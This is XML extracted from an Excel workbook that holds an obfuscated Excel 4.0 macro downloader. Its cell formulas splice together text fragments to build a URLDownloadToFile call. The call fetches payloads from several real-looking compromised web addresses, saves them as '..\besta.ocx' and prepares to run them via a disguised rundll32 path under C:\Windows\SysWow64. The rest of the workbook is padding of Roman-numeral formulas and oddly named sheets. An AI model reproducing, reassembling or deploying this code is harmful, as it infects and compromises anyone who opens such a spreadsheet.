        <v>41</v>
      </c>
      <c r="R16" s="1" t="s">
        <v>39</v>
      </c>
    </row>
    <row r="17" spans="2:18" x14ac:dyDescent="0.25">
      <c r="H17" s="1" t="s">
        <v>15</v>
      </c>
    </row>
    <row r="18" spans="2:18" x14ac:dyDescent="0.25">
      <c r="B18" s="1">
        <v>3</v>
      </c>
      <c r="F18" s="1" t="s">
        <v>36</v>
      </c>
      <c r="K18" s="1" t="s">
        <v>32</v>
      </c>
      <c r="P18" s="1" t="s">
        <v>30</v>
      </c>
      <c r="R18" s="1" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="20" spans="2:18" x14ac:dyDescent="0.25">
      <c r="C20" s="1">
        <v>2</v>
      </c>
      <c r="M20" s="1" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="21" spans="2:18" x14ac:dyDescent="0.25">
      <c r="E21" s="1" t="s">
        <v>33</v>
      </c>
      <c r="H21" s="1" t="s">
        <v>37</v>
      </c>
    </row>
    <row r="23" spans="2:18" x14ac:dyDescent="0.25">
      <c r="G23" s="1" t="s">
        <v>24</v>
      </c>
      <c r="K23" s="1" t="s">
        <v>20</v>
      </c>
      <c r="R23" s="1" t="s">
        <v>46</v>
      </c>
    </row>
    <row r="24" spans="2:18" x14ac:dyDescent="0.25">
      <c r="B24" s="1" t="s">
        <v>9</v>
      </c>
      <c r="F24" s="1" t="s">
        <v>37</v>
      </c>
      <c r="N24" s="1" t="s">
        <v>41</v>
      </c>
    </row>
    <row r="25" spans="2:18" x14ac:dyDescent="0.25">
      <c r="I25" s="1" t="s">
        <v>34</v>
      </c>
    </row>
    <row r="26" spans="2:18" x14ac:dyDescent="0.25">
      <c r="C26" s="1" t="s">
        <v>35</v>
      </c>
    </row>
    <row r="27" spans="2:18" x14ac:dyDescent="0.25">
      <c r="K27" s="1" t="s">
        <v>35</v>
      </c>
    </row>
    <row r="28" spans="2:18" x14ac:dyDescent="0.25">
      <c r="H28" s="1" t="s">
        <v>38</v>
      </c>
    </row>
    <row r="29" spans="2:18" x14ac:dyDescent="0.25">
      <c r="E29" s="1" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="39" spans="4:19" x14ac:dyDescent="0.25">
      <c r="D39" s="1">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
      <c r="J39" s="1">
        <f>_xlfn.ARABIC("LXXVI")</f>
        <v>76</v>
      </c>
    </row>
    <row r="40" spans="4:19" x14ac:dyDescent="0.25">
      <c r="G40" s="1">
        <f>_xlfn.ARABIC("LXV")</f>
        <v>65</v>
      </c>
    </row>
    <row r="41" spans="4:19" x14ac:dyDescent="0.25">
      <c r="R41" s="1">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="43" spans="4:19" x14ac:dyDescent="0.25">
      <c r="N43" s="1">
        <f>_xlfn.ARABIC("CI")</f>
        <v>101</v>
      </c>
    </row>
    <row r="45" spans="4:19" x14ac:dyDescent="0.25">
      <c r="E45" s="1">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="46" spans="4:19" x14ac:dyDescent="0.25">
      <c r="S46" s="1">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="52" spans="10:13" x14ac:dyDescent="0.25">
      <c r="M52" s="1" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="54" spans="10:13" x14ac:dyDescent="0.25">
      <c r="K54" s="1" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="56" spans="10:13" x14ac:dyDescent="0.25">
      <c r="K56" s="1" t="s">
        <v>32</v>
      </c>
    </row>
    <row r="58" spans="10:13" x14ac:dyDescent="0.25">
      <c r="J58" s="1" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="61" spans="10:13" x14ac:dyDescent="0.25">
      <c r="M61" s="1" t="s">
        <v>44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T18"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="2:20" x14ac:dyDescent="0.25">
      <c r="I1" s="1" t="str">
        <f>TEXT("undll32.exe",535)</f>
        <v>undll32.exe</v>
      </c>
    </row>
    <row r="3" spans="2:20" x14ac:dyDescent="0.25">
      <c r="B3" s="1" t="str">
        <f>T('Ss1'!R12&amp;'Ss1'!R16&amp;'Ss1'!A2)</f>
        <v>("u</v>
      </c>
      <c r="G3" s="1" t="str">
        <f>T('Ss1'!F13&amp;'Ss1'!R16&amp;'Ss1'!R7&amp;'Ss1'!R16&amp;'Ss1'!H2&amp;'Ss1'!H2)</f>
        <v>A","JJ</v>
      </c>
      <c r="Q3" s="1" t="str">
        <f>TEXT("C:\Windows\",12121)</f>
        <v>C:\Windows\</v>
      </c>
    </row>
    <row r="5" spans="2:20" x14ac:dyDescent="0.25">
      <c r="D5" s="1" t="str">
        <f>T('Ss1'!A6&amp;'Ss1'!C2&amp;'Ss1'!B9&amp;'Ss1'!E2&amp;'Ss1'!R16&amp;'Ss1'!R7&amp;'Ss1'!R16&amp;'Ss1'!D7&amp;'Ss1'!C10&amp;'Ss1'!A13&amp;'Ss1'!B12&amp;'Ss1'!B9&amp;'Ss1'!D14&amp;'Ss1'!E2&amp;'Ss1'!A6&amp;'Ss1'!B9&amp;'Ss1'!F3&amp;'Ss1'!E6&amp;'Ss1'!F9&amp;'Ss1'!B9&amp;'Ss1'!E11&amp;'Ss1'!H7&amp;'Ss1'!A6)</f>
        <v>lmon","URLDownloadToFil</v>
      </c>
      <c r="L5" s="1" t="str">
        <f>T('Ss1'!J1&amp;'Ss1'!J1&amp;'Ss1'!R16&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;H18&amp;'Ss1'!R5&amp;'Ss1'!R5&amp;'Ss1'!R3&amp;'Ss1'!P2&amp;'Ss1'!O1&amp;'Ss1'!O9&amp;'Ss1'!B24&amp;'Ss1'!F3&amp;'Ss1'!R5&amp;'Ss1'!H17&amp;'Ss1'!I12&amp;'Ss1'!K8&amp;'Ss1'!R16&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R14)</f>
        <v>BB",0,"http://cuoihoitugia.com/aecidiostage/vkot3ACpTsf8jGua1h/","..\besta.ocx",0,0)</v>
      </c>
    </row>
    <row r="6" spans="2:20" x14ac:dyDescent="0.25">
      <c r="T6" s="1" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="9" spans="2:20" x14ac:dyDescent="0.25">
      <c r="B9" s="1" t="str">
        <f>T('Ss1'!J1&amp;'Ss1'!J1&amp;'Ss1'!R16&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;Ssbr2!F16&amp;'Ss1'!R5&amp;'Ss1'!R5&amp;'Ss1'!R3&amp;'Ss1'!P2&amp;'Ss1'!O1&amp;'Ss1'!O9&amp;'Ss1'!B24&amp;'Ss1'!F3&amp;'Ss1'!R5&amp;'Ss1'!H17&amp;'Ss1'!I12&amp;'Ss1'!K8&amp;'Ss1'!R16&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R14)</f>
        <v>BB",0,"http://ielts-world.trimion.org/wp-content/uploads/0qkRwoQ1sl7/","..\besta.ocx",0,0)</v>
      </c>
      <c r="O9" s="1" t="str">
        <f>T('Ss1'!J1&amp;'Ss1'!J1&amp;'Ss1'!R16&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;J16&amp;'Ss1'!R5&amp;'Ss1'!R5&amp;'Ss1'!R3&amp;'Ss1'!P2&amp;'Ss1'!O1&amp;'Ss1'!O9&amp;'Ss1'!B24&amp;'Ss1'!F3&amp;'Ss1'!R5&amp;'Ss1'!H17&amp;'Ss1'!I12&amp;'Ss1'!K8&amp;'Ss1'!R16&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;'Ss1'!I8&amp;'Ss1'!R14)</f>
        <v>BB",0,"https://tvtecom.vn/heterocellular/9bJnG9wfi3vL/","..\besta.ocx",0,0)</v>
      </c>
    </row>
    <row r="10" spans="2:20" x14ac:dyDescent="0.25">
      <c r="K10" s="1" t="str">
        <f>TEXT("SysWow64\r",12)</f>
        <v>SysWow64\r</v>
      </c>
    </row>
    <row r="16" spans="2:20" x14ac:dyDescent="0.25">
      <c r="F16" s="1" t="s">
        <v>47</v>
      </c>
      <c r="J16" s="1" t="s">
        <v>49</v>
      </c>
    </row>
    <row r="18" spans="8:8" x14ac:dyDescent="0.25">
      <c r="H18" s="1" t="s">
        <v>48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8</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="12" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Ss1</vt:lpstr>
      <vt:lpstr>Ssbr2</vt:lpstr>
      <vt:lpstr>Ssbr3</vt:lpstr>
      <vt:lpstr>EFEWF</vt:lpstr>
      <vt:lpstr>Buk1</vt:lpstr>
      <vt:lpstr>Buk2</vt:lpstr>
      <vt:lpstr>Buk3</vt:lpstr>
      <vt:lpstr>Buk4</vt:lpstr>
      <vt:lpstr>Buk5</vt:lpstr>
      <vt:lpstr>Buk6</vt:lpstr>
      <vt:lpstr>Buk7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</dc:creator>
  <cp:lastModifiedBy>Админ</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:19:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-11-25T13:16:07Z</dcterms:modified>
</cp:coreProperties>
</file>